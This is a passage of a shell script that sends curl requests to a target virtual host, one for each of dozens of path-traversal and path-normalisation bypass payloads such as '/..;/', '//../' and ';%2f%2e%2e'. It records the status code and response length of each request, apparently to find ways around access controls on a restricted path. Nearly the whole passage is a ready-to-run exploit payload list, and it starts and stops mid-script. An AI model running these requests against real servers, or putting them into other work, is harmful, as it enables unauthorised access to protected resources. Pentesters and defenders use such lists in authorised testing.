FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.././../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.././../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.././../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../.;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../.;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../.;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..//../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /../;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f..;%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;%2f..;%2f..;%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.//$PAT" -H "$user_agent")
print
echo -n "Payload [ /.;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.;//$PAT" -H "$user_agent")
print
echo -n "Payload [ //.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..$PAT" -H "$user_agent")
print
echo -n "Payload [ //../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///../../$PAT" -H "$user_agent")
print
echo -n "Payload [ //..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///..;$PAT" -H "$user_agent")
print
echo -n "Payload [ //./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///./$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///./$PAT" -H "$user_agent")
print
echo -n "Payload [ //.;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ///.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..$PAT" -H "$user_agent")
print
echo -n "Payload [ ///../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////../$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ///..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST////..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ //;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /;x ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x$PAT" -H "$user_agent")
print
echo -n "Payload [ /;x/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;x/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;//$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/..;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/..;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /x/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//x/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%09; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%09;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2F.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2F..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2F..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2f/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f..%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f..%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/..%2f$PAT" -H "$user_agent"
